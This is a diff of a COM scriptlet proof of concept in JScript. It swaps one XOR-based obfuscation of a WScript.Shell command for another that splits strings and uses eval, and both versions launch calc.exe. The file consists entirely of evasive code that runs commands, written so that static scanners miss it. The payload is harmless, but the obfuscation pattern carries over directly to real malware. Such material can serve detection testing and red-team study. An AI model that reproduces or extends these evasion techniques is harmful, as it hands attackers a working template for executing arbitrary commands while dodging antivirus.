@@ -1,33 +1,20 @@
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
-    progid="PoC"
+    progid="DynamicEvalProgID"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
 	<script language="JScript">
 		<![CDATA[
-			// Ofuscated decryption function that seems benign
-			function pseudoRandomGenerator(seed) {
-				var pseudoRandom = (seed * 0x343FD + 0x269EC3) & 0xFFFFFFFF;
-				return (pseudoRandom >> 16) & 0x7FFF;
-			}
+			// Dynamic string construction for obfuscation
+			var parts = ['calc', '.', 'e', 'x', 'e'];
+			var command = parts[0] + parts[1] + parts[2] + parts[3] + parts[4];
 			
-			// Split and obfuscated key
-			var keyPart1 = 0x25;
-			var keyPart2 = 0x30;
-			var xorKey = keyPart1 + keyPart2;
+			// Dynamically construct ActiveXObject string
+			var objName = ['WScrip', 't.Shel', 'l'].join('');
 			
-			// Encrypted command using the XOR cipher
-			var encryptedCmd = [54, 52, 57, 54, 123, 48, 45, 48];
-			
-			// Decrypt the command
-			var cmd = "";
-			for (var i = 0; i < encryptedCmd.length; i++) {
-				cmd += String.fromCharCode(encryptedCmd[i] ^ xorKey);
-			}
-			
-			// Execute the decrypted command
-			var shell = new ActiveXObject("WScript.Shell");
-			var execResult = shell.Run(cmd);
+			// Use eval for dynamic execution
+			var runCommand = 'new ActiveXObject(objName).Run(command);';
+			eval(runCommand);
 		]]>
 	</script>
 </registration>
